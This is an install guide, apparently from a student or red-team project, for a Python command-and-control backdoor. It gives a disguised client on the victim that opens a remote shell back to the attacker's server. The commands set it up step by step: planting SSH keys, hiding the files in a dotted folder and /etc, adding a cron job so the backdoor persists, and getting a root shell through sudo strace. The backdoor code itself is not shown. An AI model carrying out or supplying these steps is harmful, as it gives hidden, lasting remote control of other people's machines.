# Command-and-Control

## Backdoor Explanation
- Backdoor is primarily a two-part Python program, with an additional script and configuration file:
  - cent_OS_config (client.py) on the victim machine
  - server.py on the attacking machine
  - script.sh on the victim machine
  -config.ini on both machines
- server.py is run on the attacking machine. Once server.py is up and running, anytime client.py is run it will connect to the attacking machine and act as a remote shell.
- This remote shell allows the attacker to execute commands remotely on the victim machine from the attacking machine.

## How to install
**(indentations indicate performing the indented commands within whatever the outer level command’s shell/input request)**

- **This guide assumes:**
	- The server.py, cent_OS_config (client.py), script.sh, and config.ini files are placed in the attacker’s desktop and will end up in the victim’s /etc/ folder.
    -   If you want to move the file locations on the server’s side, you will also need to simply edit the initial setup scp commands and the location of the configuration file within the server python file.
    -   Since the file locations dictate what is and isn’t allowed to run on the client’s side, moving the file locations on the client’s side is more involved and requires editing a variety of commands, files, and permissions.
    -   For these reasons, it is not recommended to try altering the file locations on your first attempt at running the backdoor.

-   On the attacking machine:
	- ssh-keygen -t rsa -b 4096 -C “[_user_@google.com](mailto:_user_@google.com)”
    -   ssh-copy-id user@{victim machine IP address}
    -   ssh user@{victim machine IP address}
	    - mkdir -p ~/.cent_OS
	    - exit
    - scp Desktop/cent_OS_config  user@{victim machine IP address}:~/.cent_OS
    - scp Desktop/script.sh user@{victim machine IP address}:~/.cent_OS
    -   scp Desktop/config.ini user@{victim machine IP address}:~/.cent_OS
    -   ssh user@{victim machine IP address}
	    - crontab -e
		    - **Hit i**
		    - ***/{frequency in minutes to activate} * * * * /home/user/.cent_OS/script.sh**
		    - **Hit \<esc>**
		    - :wq
    - sudo strace -o /dev/null /bin/sh
	    - sudo scp /home/user/.cent_OS/cent_OS_config /etc
	    -   sudo scp /home/user/.cent_OS/config.ini /etc
	    -   chmod +rwx /home/user/.cent_OS/script.sh
	    -   exit
    - exit
   - python Desktop/server.py **and wait for the victim to make a connection**
